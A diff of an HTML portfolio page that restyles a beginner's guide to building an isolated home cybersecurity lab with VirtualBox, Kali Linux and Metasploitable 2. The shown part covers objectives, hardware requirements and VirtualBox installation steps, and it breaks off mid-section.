@@ -3,118 +3,371 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Project 1 — Home Security Lab | Gaurav Shirke</title>
+<title>Project 01 — Home Security Lab | Gaurav Shirke</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
-:root{--black:#020608;--bg:#050d10;--bg2:#091318;--bg3:#0d1c22;--green:#00e5a0;--green2:#00ffb3;--cyan:#00d4ff;--amber:#f5a623;--red:#ff3b5c;--text:#b8cdd8;--muted:#4a6572;--border:#112030;--fd:'Orbitron',sans-serif;--fm:'Share Tech Mono',monospace;--fb:'Rajdhani',sans-serif;}
+/* ── EXACT TOKENS FROM index.html ── */
+:root {
+  --black:#020608;--bg:#050d10;--bg2:#091318;--bg3:#0d1c22;
+  --green:#00e5a0;--green2:#00ffb3;--cyan:#00d4ff;--cyan2:#7fffd4;
+  --amber:#f5a623;--red:#ff3b5c;--text:#b8cdd8;--muted:#4a6572;--border:#112030;
+  --glow:0 0 20px rgba(0,229,160,0.4),0 0 40px rgba(0,229,160,0.2);
+  --font-d:'Orbitron',sans-serif;
+  --font-m:'Share Tech Mono',monospace;
+  --font-b:'Rajdhani',sans-serif;
+}
+
+/* ── RESET ── */
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 html{scroll-behavior:smooth;}
-body{background:var(--black);color:var(--text);font-family:var(--fb);font-size:16px;line-height:1.7;overflow-x:hidden;}
-body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,229,160,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,160,.025) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0;}
-.progress{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--green),var(--cyan));z-index:200;transition:width .1s;width:0%;}
-nav{position:sticky;top:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:0 48px;height:56px;background:rgba(2,6,8,.95);backdrop-filter:blur(20px);border-bottom:1px solid rgba(0,229,160,.12);}
-.nav-logo{font-family:var(--fm);font-size:13px;color:var(--green);text-decoration:none;}
-.nav-logo .at{color:var(--cyan);}.nav-logo .pr{color:var(--muted);}
-.nav-back{font-family:var(--fm);font-size:12px;color:var(--muted);text-decoration:none;letter-spacing:.06em;transition:color .2s;}
+body{
+  background:var(--black);
+  color:var(--text);
+  font-family:var(--font-b);
+  font-size:16px;
+  line-height:1.7;
+  overflow-x:hidden;
+  cursor:none;   /* EXACT match from index.html */
+}
+
+/* ── CURSOR — EXACT COPY FROM index.html ── */
+.cursor{
+  width:12px;height:12px;
+  background:var(--green);
+  border-radius:50%;
+  position:fixed;pointer-events:none;z-index:99999;
+  transform:translate(-50%,-50%);
+  mix-blend-mode:screen;
+  transition:width .2s,height .2s,background .2s;
+}
+.cursor-ring{
+  width:36px;height:36px;
+  border:1px solid rgba(0,229,160,0.5);
+  border-radius:50%;
+  position:fixed;pointer-events:none;z-index:99998;
+  transform:translate(-50%,-50%);
+  transition:width .3s,height .3s;
+}
+
+/* ── BACKGROUND LAYERS — EXACT FROM index.html ── */
+#matrix-canvas{position:fixed;inset:0;z-index:0;opacity:.045;pointer-events:none;}
+#particle-canvas{position:fixed;inset:0;z-index:0;opacity:.7;pointer-events:none;}
+.grid-bg{position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(0,229,160,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,160,.03) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;}
+.scanlines{position:fixed;inset:0;z-index:1;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.07) 3px,rgba(0,0,0,.07) 4px);pointer-events:none;}
+.vignette{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse at center,transparent 40%,rgba(0,0,0,.65) 100%);pointer-events:none;}
+
+/* ── READING PROGRESS BAR ── */
+.progress{
+  position:fixed;top:0;left:0;height:3px;
+  background:linear-gradient(90deg,var(--green),var(--cyan));
+  z-index:2000;transition:width .1s;width:0%;
+}
+
+/* ── NAV — EXACT FROM index.html ── */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 48px;height:60px;
+  background:rgba(5,13,16,.88);
+  backdrop-filter:blur(16px);
+  border-bottom:1px solid rgba(0,229,160,.1);
+}
+.nav-logo{font-family:var(--font-m);font-size:14px;color:var(--green);text-decoration:none;}
+.nav-logo .at{color:var(--cyan);}
+.nav-logo .pr{color:var(--muted);}
+.nav-back{
+  font-family:var(--font-m);font-size:12px;color:var(--muted);
+  text-decoration:none;letter-spacing:.06em;
+  transition:color .3s;
+  display:flex;align-items:center;gap:6px;
+  position:relative;
+}
+.nav-back::after{
+  content:'';position:absolute;bottom:-4px;left:0;right:0;
+  height:1px;background:var(--green);
+  transform:scaleX(0);transition:transform .3s;
+}
 .nav-back:hover{color:var(--green);}
-.container{position:relative;z-index:1;max-width:900px;margin:0 auto;padding:60px 48px 100px;}
-.crumb{font-family:var(--fm);font-size:11px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:20px;}
-.crumb a{color:var(--green);text-decoration:none;}
-.ptag{display:inline-flex;align-items:center;gap:8px;font-family:var(--fm);font-size:11px;color:var(--amber);border:1px solid rgba(245,166,35,.3);background:rgba(245,166,35,.07);padding:5px 14px;border-radius:2px;margin-bottom:20px;letter-spacing:.1em;text-transform:uppercase;}
-h1{font-family:var(--fd);font-size:clamp(22px,4vw,40px);font-weight:900;color:#fff;line-height:1.15;margin-bottom:16px;letter-spacing:.02em;}
+.nav-back:hover::after{transform:scaleX(1);}
+
+.nav-st{display:flex;align-items:center;gap:8px;font-family:var(--font-m);font-size:11px;color:var(--muted);}
+.sdot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:sdot 2s infinite;}
+@keyframes sdot{0%,100%{box-shadow:0 0 0 0 rgba(0,229,160,.6);}50%{box-shadow:0 0 0 6px rgba(0,229,160,0);}}
+
+/* ── LAYOUT ── */
+.container{
+  position:relative;z-index:10;
+  max-width:900px;margin:0 auto;
+  padding:80px 48px 100px;
+}
+
+/* ── CRUMB / HEADER ── */
+.crumb{font-family:var(--font-m);font-size:11px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:20px;}
+.crumb a{color:var(--green);text-decoration:none;transition:opacity .2s;}
+.crumb a:hover{opacity:.7;}
+
+.ptag{
+  display:inline-flex;align-items:center;gap:8px;
+  font-family:var(--font-m);font-size:11px;color:var(--amber);
+  border:1px solid rgba(245,166,35,.3);
+  background:rgba(245,166,35,.07);
+  padding:5px 14px;border-radius:2px;
+  margin-bottom:20px;letter-spacing:.1em;text-transform:uppercase;
+}
+
+h1{
+  font-family:var(--font-d);
+  font-size:clamp(22px,4vw,40px);
+  font-weight:900;color:#fff;
+  line-height:1.15;margin-bottom:16px;letter-spacing:.02em;
+}
 h1 em{font-style:normal;color:var(--green);}
+
 .pmeta{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:32px;}
-.pill{font-family:var(--fm);font-size:11px;padding:4px 12px;border-radius:2px;border:1px solid var(--border);color:var(--muted);background:var(--bg2);}
+.pill{font-family:var(--font-m);font-size:11px;padding:4px 12px;border-radius:2px;border:1px solid var(--border);color:var(--muted);background:var(--bg2);}
 .pill.g{border-color:rgba(0,229,160,.3);color:var(--green);background:rgba(0,229,160,.07);}
 .pill.a{border-color:rgba(245,166,35,.3);color:var(--amber);background:rgba(245,166,35,.07);}
-.sbanner{display:flex;align-items:flex-start;gap:14px;background:rgba(0,229,160,.06);border:1px solid rgba(0,229,160,.2);border-radius:4px;padding:18px 22px;margin-bottom:48px;font-size:14px;color:var(--text);}
-.sbdot{width:9px;height:9px;background:var(--amber);border-radius:50%;flex-shrink:0;margin-top:5px;animation:pulse 2s infinite;}
-@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(245,166,35,.6);}50%{box-shadow:0 0 0 7px rgba(245,166,35,0);}}
+
+/* ── STATUS BANNER ── */
+.sbanner{
+  display:flex;align-items:flex-start;gap:14px;
+  background:rgba(0,229,160,.06);
+  border:1px solid rgba(0,229,160,.2);
+  border-radius:4px;padding:18px 22px;
+  margin-bottom:48px;font-size:14px;color:var(--text);
+}
+.sbdot{
+  width:9px;height:9px;background:var(--amber);
+  border-radius:50%;flex-shrink:0;margin-top:5px;
+  animation:pulse 2s infinite;
+}
+@keyframes pulse{
+  0%,100%{box-shadow:0 0 0 0 rgba(245,166,35,.6);}
+  50%{box-shadow:0 0 0 7px rgba(245,166,35,0);}
+}
+
+/* ── TABLE OF CONTENTS ── */
 .toc{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:28px 32px;margin-bottom:56px;}
-.toc-title{font-family:var(--fm);font-size:11px;color:var(--cyan);letter-spacing:.15em;text-transform:uppercase;margin-bottom:18px;}
+.toc-title{font-family:var(--font-m);font-size:11px;color:var(--cyan);letter-spacing:.15em;text-transform:uppercase;margin-bottom:18px;}
 .toc ol{list-style:none;display:flex;flex-direction:column;gap:6px;counter-reset:tc;}
 .toc li{counter-increment:tc;display:flex;align-items:baseline;gap:10px;font-size:14px;}
-.toc li::before{content:counter(tc,decimal-leading-zero);font-family:var(--fm);font-size:11px;color:var(--muted);flex-shrink:0;}
+.toc li::before{content:counter(tc,decimal-leading-zero);font-family:var(--font-m);font-size:11px;color:var(--muted);flex-shrink:0;}
 .toc a{color:var(--text);text-decoration:none;transition:color .2s;}
 .toc a:hover{color:var(--green);}
+
+/* ── SECTIONS ── */
 .sec{margin-bottom:64px;}
 .anc{display:block;height:80px;margin-top:-80px;visibility:hidden;}
-.slabel{font-family:var(--fm);font-size:11px;color:var(--cyan);letter-spacing:.15em;text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:12px;}
+
+/* Section label — matches index.html .sh / .st pattern */
+.slabel{
+  font-family:var(--font-m);font-size:11px;color:var(--cyan);
+  letter-spacing:.15em;text-transform:uppercase;
+  margin-bottom:16px;
+  display:flex;align-items:center;gap:12px;
+}
 .slabel::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,229,160,.3),transparent);}
-h2{font-family:var(--fd);font-size:clamp(17px,3vw,24px);font-weight:700;color:#fff;margin-bottom:20px;letter-spacing:.04em;}
-h3{font-family:var(--fd);font-size:15px;font-weight:700;color:var(--green);margin:28px 0 12px;letter-spacing:.04em;}
-h4{font-family:var(--fm);font-size:12px;color:var(--cyan);margin:20px 0 10px;letter-spacing:.08em;text-transform:uppercase;}
+
+h2{font-family:var(--font-d);font-size:clamp(17px,3vw,24px);font-weight:700;color:#fff;margin-bottom:20px;letter-spacing:.04em;}
+h3{font-family:var(--font-d);font-size:15px;font-weight:700;color:var(--green);margin:28px 0 12px;letter-spacing:.04em;}
+h4{font-family:var(--font-m);font-size:12px;color:var(--cyan);margin:20px 0 10px;letter-spacing:.08em;text-transform:uppercase;}
 p{font-size:15px;color:var(--text);opacity:.9;margin-bottom:14px;}
 strong{color:#fff;font-weight:600;}
-pre{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:20px 22px;overflow-x:auto;margin:18px 0;}
-code{font-family:var(--fm);font-size:12.5px;color:var(--green);line-height:1.65;}
+
+/* ── CODE ── */
+pre{
+  background:var(--bg2);border:1px solid var(--border);
+  border-radius:4px;padding:20px 22px;
+  overflow-x:auto;margin:18px 0;
+}
+code{font-family:var(--font-m);font-size:12.5px;color:var(--green);line-height:1.65;}
 pre code{color:var(--green);}
-p code,li code{font-family:var(--fm);font-size:12px;background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.15);border-radius:2px;padding:2px 6px;color:var(--green);}
+p code,li code,.sd code{
+  font-family:var(--font-m);font-size:12px;
+  background:rgba(0,229,160,.08);
+  border:1px solid rgba(0,229,160,.15);
+  border-radius:2px;padding:2px 6px;color:var(--green);
+}
+.cm{color:var(--muted);}
+
+/* ── CALLOUT BOXES ── */
 .exp{background:rgba(0,229,160,.05);border:1px solid rgba(0,229,160,.2);border-left:3px solid var(--green);border-radius:0 4px 4px 0;padding:16px 20px;margin:16px 0;font-size:14px;}
-.exp-lbl{font-family:var(--fm);font-size:10px;color:var(--green);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+.exp-lbl{font-family:var(--font-m);font-size:10px;color:var(--green);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
 .warn{background:rgba(245,166,35,.07);border:1px solid rgba(245,166,35,.25);border-left:3px solid var(--amber);border-radius:0 4px 4px 0;padding:16px 20px;margin:16px 0;font-size:14px;}
-.warn-lbl{font-family:var(--fm);font-size:10px;color:var(--amber);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+.warn-lbl{font-family:var(--font-m);font-size:10px;color:var(--amber);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
 .tip{background:rgba(0,212,255,.06);border:1px solid rgba(0,212,255,.2);border-left:3px solid var(--cyan);border-radius:0 4px 4px 0;padding:16px 20px;margin:16px 0;font-size:14px;}
-.tip-lbl{font-family:var(--fm);font-size:10px;color:var(--cyan);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+.tip-lbl{font-family:var(--font-m);font-size:10px;color:var(--cyan);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;}
+
+/* ── TABLES ── */
 .tw{overflow-x:auto;margin:20px 0;}
 table{width:100%;border-collapse:collapse;font-size:14px;}
-th{font-family:var(--fm);font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:.08em;padding:10px 16px;border-bottom:1px solid rgba(0,229,160,.2);text-align:left;background:rgba(0,229,160,.04);}
+th{font-family:var(--font-m);font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:.08em;padding:10px 16px;border-bottom:1px solid rgba(0,229,160,.2);text-align:left;background:rgba(0,229,160,.04);}
 td{padding:10px 16px;border-bottom:1px solid var(--border);color:var(--text);}
 tr:last-child td{border-bottom:none;}
+tr:hover td{background:rgba(0,229,160,.025);}
+
+/* ── STEPS — matches index.html card style ── */
 .steps{display:flex;flex-direction:column;gap:2px;margin:18px 0;}
-.step{display:flex;gap:18px;align-items:flex-start;background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:18px 22px;transition:border-color .2s;}
-.step:hover{border-color:rgba(0,229,160,.2);}
-.sn{font-family:var(--fd);font-size:20px;font-weight:900;color:var(--green);opacity:.35;min-width:26px;line-height:1.1;flex-shrink:0;}
+.step{
+  display:flex;gap:18px;align-items:flex-start;
+  background:var(--bg);            /* exact .skg / .expc bg */
+  border:1px solid var(--border);
+  border-radius:4px;padding:18px 22px;
+  transition:border-color .3s,transform .3s,box-shadow .3s;
+  position:relative;overflow:hidden;
+}
+.step::before{
+  content:'';position:absolute;top:0;left:0;
+  width:3px;height:100%;
+  background:linear-gradient(180deg,var(--green),var(--cyan));
+  opacity:0;transition:opacity .3s;
+}
+.step:hover{
+  border-color:rgba(0,229,160,.3);
+  transform:translateY(-2px);
+  box-shadow:0 6px 30px rgba(0,0,0,.35),0 0 16px rgba(0,229,160,.06);
+}
+.step:hover::before{opacity:1;}
+.sn{font-family:var(--font-d);font-size:20px;font-weight:900;color:var(--green);opacity:.35;min-width:26px;line-height:1.1;flex-shrink:0;}
 .sb{flex:1;}
 .st2{font-size:15px;font-weight:600;color:#fff;margin-bottom:5px;}
 .sd{font-size:14px;color:var(--muted);line-height:1.65;}
-.sd code{font-family:var(--fm);font-size:11px;background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.15);border-radius:2px;padding:1px 5px;color:var(--green);}
+
+/* ── TOOL GRID ── */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(165px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin:18px 0;}
+.tc{background:var(--bg);padding:14px 16px;transition:background .3s;}
+.tc:hover{background:var(--bg2);}
+.tcn{font-size:14px;color:#fff;font-weight:600;margin-bottom:3px;}
+.tcd{font-size:11px;color:var(--muted);font-family:var(--font-m);}
+
+/* ── CHECKLIST ── */
 .cl{list-style:none;display:flex;flex-direction:column;gap:10px;margin:18px 0;}
 .cl li{display:flex;align-items:flex-start;gap:12px;font-size:15px;color:var(--text);}
-.cl li::before{content:'☐';font-size:16px;color:var(--muted);flex-shrink:0;margin-top:1px;font-family:var(--fm);}
-.pbox{background:var(--bg2);border:1px solid rgba(0,229,160,.3);border-radius:4px;padding:32px;position:relative;overflow:hidden;margin-top:40px;}
+.cl li::before{content:'☐';font-size:16px;color:var(--muted);flex-shrink:0;margin-top:1px;font-family:var(--font-m);}
+
+/* ── SCREENSHOT NOTE ── */
+.ssnote{
+  display:inline-flex;align-items:center;gap:6px;
+  font-family:var(--font-m);font-size:11px;color:var(--amber);
+  background:rgba(245,166,35,.07);border:1px solid rgba(245,166,35,.2);
+  border-radius:2px;padding:4px 10px;margin:8px 0;
+}
+
+/* ── PORTFOLIO BOX ── */
+.pbox{
+  background:var(--bg);         /* matches index.html .ctbox / .expc bg */
+  border:1px solid rgba(0,229,160,.3);
+  border-radius:4px;padding:32px;
+  position:relative;overflow:hidden;margin-top:40px;
+}
 .pbox::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--green),var(--cyan));}
-.pbox h3{font-family:var(--fd);font-size:15px;color:#fff;margin-bottom:16px;}
-.pver{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:20px;margin-top:16px;font-size:14px;line-height:1.75;color:var(--text);position:relative;}
-.pvlbl{font-family:var(--fm);font-size:10px;color:var(--cyan);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px;}
-.cbtn{position:absolute;top:12px;right:12px;font-family:var(--fm);font-size:11px;padding:5px 12px;background:rgba(0,229,160,.1);border:1px solid rgba(0,229,160,.2);border-radius:2px;color:var(--green);cursor:pointer;transition:all .2s;letter-spacing:.06em;}
+.pbox-title{font-family:var(--font-d);font-size:15px;color:#fff;margin-bottom:16px;}
+.pver{background:var(--bg2);border:1px solid var(--border);border-radius:4px;padding:20px;margin-top:14px;font-size:14px;line-height:1.75;color:var(--text);position:relative;}
+.pvlbl{font-family:var(--font-m);font-size:10px;color:var(--cyan);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px;}
+.cbtn{
+  position:absolute;top:12px;right:12px;
+  font-family:var(--font-m);font-size:11px;
+  padding:5px 12px;
+  background:rgba(0,229,160,.1);
+  border:1px solid rgba(0,229,160,.2);
+  border-radius:2px;color:var(--green);
+  cursor:pointer;transition:all .2s;letter-spacing:.06em;
+}
 .cbtn:hover{background:rgba(0,229,160,.2);}
-.tgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(165px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:4px;overflow:hidden;margin:18px 0;}
-.tc{background:var(--bg2);padding:14px 16px;}
-.tcn{font-size:14px;color:#fff;font-weight:600;margin-bottom:3px;}
-.tcd{font-size:11px;color:var(--muted);font-family:var(--fm);}
+
+/* ── SKILL TAGS — same as index.html .sktag ── */
 .tagrow{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0;}
-.stag{font-family:var(--fm);font-size:12px;padding:4px 12px;background:rgba(0,229,160,.07);border:1px solid rgba(0,229,160,.2);border-radius:2px;color:var(--green);}
-.ssnote{display:inline-flex;align-items:center;gap:6px;font-family:var(--fm);font-size:11px;color:var(--amber);background:rgba(245,166,35,.07);border:1px solid rgba(245,166,35,.2);border-radius:2px;padding:4px 10px;margin:8px 0;}
-.cm{color:var(--muted);}
-footer{position:relative;z-index:1;text-align:center;padding:24px 48px;border-top:1px solid var(--border);font-family:var(--fm);font-size:12px;color:var(--muted);}
+.stag{
+  font-family:var(--font-m);font-size:12px;
+  padding:5px 12px;
+  background:rgba(0,229,160,.05);
+  border:1px solid rgba(0,229,160,.15);
+  border-radius:2px;color:var(--text);
+  cursor:none;transition:all .25s;
+  position:relative;overflow:hidden;
+}
+.stag::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,229,160,.1),transparent);opacity:0;transition:opacity .25s;}
+.stag:hover{border-color:var(--green);color:var(--green);transform:scale(1.08) translateY(-2px);box-shadow:0 0 14px rgba(0,229,160,.3);}
+.stag:hover::before{opacity:1;}
+
+/* ── FOOTER — exact from index.html ── */
+footer{
+  position:relative;z-index:10;
+  text-align:center;padding:26px 48px;
+  border-top:1px solid var(--border);
+  font-family:var(--font-m);font-size:12px;color:var(--muted);
+}
 footer a{color:var(--green);text-decoration:none;}
-@media(max-width:700px){nav{padding:0 20px;}.container{padding:40px 20px 80px;}}
+footer span{color:var(--green);}
+
+/* ── ANIMATIONS — exact from index.html ── */
+@keyframes fu{from{opacity:0;transform:translateY(28px);}to{opacity:1;transform:translateY(0);}}
+.reveal{opacity:0;transform:translateY(32px);transition:opacity .7s cubic-bezier(.25,.46,.45,.94),transform .7s cubic-bezier(.25,.46,.45,.94);}
+.reveal.visible{opacity:1;transform:translateY(0);}
+.rd1{transition-delay:.1s;}.rd2{transition-delay:.2s;}.rd3{transition-delay:.3s;}.rd4{transition-delay:.4s;}
+
+/* ── SCROLLBAR — exact from index.html ── */
+::-webkit-scrollbar{width:4px;}
+::-webkit-scrollbar-track{background:var(--black);}
+::-webkit-scrollbar-thumb{background:rgba(0,229,160,.3);border-radius:2px;}
+::-webkit-scrollbar-thumb:hover{background:var(--green);}
+
+/* ── RESPONSIVE — mirrors index.html ── */
+@media(max-width:768px){
+  nav{padding:0 20px;}
+  .container{padding:70px 20px 80px;}
+}
 </style>
 </head>
 <body>
+
+<!-- EXACT background layer order from index.html -->
+<canvas id="matrix-canvas"></canvas>
+<canvas id="particle-canvas"></canvas>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<!-- READING PROGRESS -->
 <div class="progress" id="prog"></div>
+
+<!-- CURSOR — exact class names and IDs from index.html -->
+<div class="cursor" id="cur"></div>
+<div class="cursor-ring" id="cur-ring"></div>
+
+<!-- NAV -->
 <nav>
   <a href="index.html" class="nav-logo">Gaurav<span class="at">@</span>Security<span class="pr">:~$</span></a>
-  <a href="index.html#projects" class="nav-back">← back to portfolio</a>
+  <div style="display:flex;align-items:center;gap:32px;">
+    <a href="index.html#projects" class="nav-back">← back to portfolio</a>
+    <div class="nav-st"><div class="sdot"></div><span>SECURE_CONNECTION</span></div>
+  </div>
 </nav>
+
 <div class="container">
+
+  <!-- HEADER -->
   <div class="crumb"><a href="index.html">Gaurav Shirke</a> / <a href="index.html#projects">Projects</a> / Home Security Lab</div>
   <div class="ptag">Project 01 · Infrastructure · Home Lab</div>
   <h1>Built a Home Cybersecurity Lab to <em>Simulate Real Network Attacks</em></h1>
+
   <div class="pmeta">
     <span class="pill a">Status: Planned</span>
-    <span class="pill">Network Security</span><span class="pill">Ethical Hacking</span>
-    <span class="pill">Penetration Testing</span><span class="pill">Incident Response</span>
+    <span class="pill">Network Security</span>
+    <span class="pill">Ethical Hacking</span>
+    <span class="pill">Penetration Testing</span>
+    <span class="pill">Incident Response</span>
     <span class="pill g">VirtualBox 7.2.6 · Kali Linux 2026.1</span>
   </div>
+
   <div class="sbanner">
     <div class="sbdot"></div>
     <div>Complete beginner-friendly guide — start from zero and finish with a working attack-and-defend lab in one weekend. Every command has been verified. All tools are free.</div>
   </div>
 
   <!-- TOC -->
-  <div class="toc">
+  <div class="toc reveal">
     <div class="toc-title">Table of Contents</div>
     <ol class="toc">
       <li><a href="#s1">Project Overview &amp; Objectives</a></li>
@@ -135,36 +388,53 @@ footer a{color:var(--green);text-decoration:none;}
     </ol>
   </div>
 
-  <!-- S1 -->
-  <div class="sec"><span class="anc" id="s1"></span>
+  <!-- ═══ SECTION 1 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s1"></span>
     <div class="slabel">01 — Overview</div>
     <h2>Project Overview &amp; Objectives</h2>
     <p>You are going to build your own <strong>personal cybersecurity training range</strong> — entirely inside your laptop. Think of it as a miniature internet with its own computers, its own network, and real attack-and-defence scenarios — but completely isolated from the real world so you cannot accidentally harm anything.</p>
     <p>By the end of this project you will have a <strong>Kali Linux attacker machine</strong> loaded with professional security tools, a <strong>Metasploitable 2 vulnerable target</strong>, and hands-on experience with real attack techniques and real defences.</p>
-    <div class="tw"><table><thead><tr><th>Skill</th><th>Tool Used</th></tr></thead><tbody>
-      <tr><td>Virtual machine setup and management</td><td>Oracle VirtualBox 7.2.6</td></tr>
-      <tr><td>Network reconnaissance</td><td>Nmap</td></tr>
-      <tr><td>Vulnerability scanning</td><td>Nikto, OpenVAS</td></tr>
-      <tr><td>Exploitation of known CVEs</td><td>Metasploit Framework</td></tr>
-      <tr><td>Packet capture and analysis</td><td>Wireshark</td></tr>
-      <tr><td>Firewall configuration</td><td>UFW / iptables</td></tr>
-      <tr><td>Intrusion detection basics</td><td>fail2ban, system logs</td></tr>
-      <tr><td>Professional documentation</td><td>Written report + screenshots</td></tr>
-    </tbody></table></div>
+    <div class="tw">
+      <table>
+        <thead><tr><th>Skill</th><th>Tool Used</th></tr></thead>
+        <tbody>
+          <tr><td>Virtual machine setup and management</td><td>Oracle VirtualBox 7.2.6</td></tr>
+          <tr><td>Network reconnaissance</td><td>Nmap</td></tr>
+          <tr><td>Vulnerability scanning</td><td>Nikto, OpenVAS</td></tr>
+          <tr><td>Exploitation of known CVEs</td><td>Metasploit Framework</td></tr>
+          <tr><td>Packet capture and analysis</td><td>Wireshark</td></tr>
+          <tr><td>Firewall configuration</td><td>UFW / iptables</td></tr>
+          <tr><td>Intrusion detection basics</td><td>fail2ban, system logs</td></tr>
+          <tr><td>Professional documentation</td><td>Written report + screenshots</td></tr>
+        </tbody>
+      </table>
+    </div>
   </div>
 
-  <!-- S2 -->
-  <div class="sec"><span class="anc" id="s2"></span>
+  <!-- ═══ SECTION 2 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s2"></span>
     <div class="slabel">02 — Requirements</div>
     <h2>Hardware &amp; Software Requirements</h2>
-    <div class="tw"><table><thead><tr><th>Component</th><th>Minimum</th><th>Recommended</th></tr></thead><tbody>
-      <tr><td>CPU</td><td>Intel Core i5 (4 cores) / AMD Ryzen 5</td><td>Intel Core i7 / Ryzen 7 (6+ cores)</td></tr>
-      <tr><td>RAM</td><td>8 GB</td><td>16 GB or more</td></tr>
-      <tr><td>Free Disk Space</td><td>60 GB</td><td>100 GB+ on SSD</td></tr>
-      <tr><td>Operating System</td><td>Windows 10/11, macOS 12+, Ubuntu 20.04+</td><td>Any of the above</td></tr>
-      <tr><td>Virtualisation</td><td>Intel VT-x / AMD-V enabled in BIOS</td><td>Same, confirmed working</td></tr>
-    </tbody></table></div>
-    <div class="warn"><div class="warn-lbl">⚠ Critical First Check</div><strong>Enable Virtualisation in BIOS before anything else.</strong><br>Windows: Open Task Manager → Performance tab → CPU → confirm "Virtualisation: Enabled".<br>If disabled: Restart → press F2/F10/Del → find "Intel VT-x" or "AMD-V" → Enable → Save and exit.</div>
+    <div class="tw">
+      <table>
+        <thead><tr><th>Component</th><th>Minimum</th><th>Recommended</th></tr></thead>
+        <tbody>
+          <tr><td>CPU</td><td>Intel Core i5 (4 cores) / AMD Ryzen 5</td><td>Intel Core i7 / Ryzen 7 (6+ cores)</td></tr>
+          <tr><td>RAM</td><td>8 GB</td><td>16 GB or more</td></tr>
+          <tr><td>Free Disk Space</td><td>60 GB</td><td>100 GB+ on SSD</td></tr>
+          <tr><td>Operating System</td><td>Windows 10/11, macOS 12+, Ubuntu 20.04+</td><td>Any of the above</td></tr>
+          <tr><td>Virtualisation</td><td>Intel VT-x / AMD-V enabled in BIOS</td><td>Same, confirmed working</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="warn">
+      <div class="warn-lbl">⚠ Critical First Check</div>
+      <strong>Enable Virtualisation in BIOS before anything else.</strong><br><br>
+      <strong>Windows:</strong> Open Task Manager → Performance tab → CPU → confirm "Virtualisation: Enabled".<br>
+      <strong>If disabled:</strong> Restart → press F2/F10/Del → find "Intel VT-x" or "AMD-V" → Enable → Save and exit.
+    </div>
     <h3>Software You Will Download (All Free)</h3>
     <div class="tgrid">
       <div class="tc"><div class="tcn">VirtualBox 7.2.6</div><div class="tcd">Virtualisation platform</div></div>
@@ -174,10 +444,12 @@ footer a{color:var(--green);text-decoration:none;}
     </div>
   </div>
 
-  <!-- S3 -->
-  <div class="sec"><span class="anc" id="s3"></span>
+  <!-- ═══ SECTION 3 ═══ -->
+  <div class="sec reveal">
+    <span class="anc" id="s3"></span>
     <div class="slabel">03 — VirtualBox</div>
     <h2>Step-by-Step Installation of VirtualBox</h2>
+
     <h3>3.1 Download VirtualBox</h3>
     <div class="steps">
       <div class="step"><div class="sn">1</div><div class="sb"><div class="st2">Go to the official download page</div><div class="sd">Open your browser: <code>https://www.virtualbox.org/wiki/Downloads</code></div></div></div>
@@ -196,20 +468,21 @@ footer a{color:var(--green);text-decoration:none;}
 
     <h3>3.3 Install the Extension Pack</h3>
     <div class="steps">
-      <div class="step"><div class="sn">7</div><div class="sb"><div class="st2">Download the Extension Pack</div><div class="sd">On the same downloads page find "VirtualBox 7.2.6 Oracle VM VirtualBox Extension Pack" → click <strong>"All supported platforms"</strong>. File: <code>Oracle_VirtualBox_Extension_Pack-7.2.6.vbox-extpack</code></div></div></div>
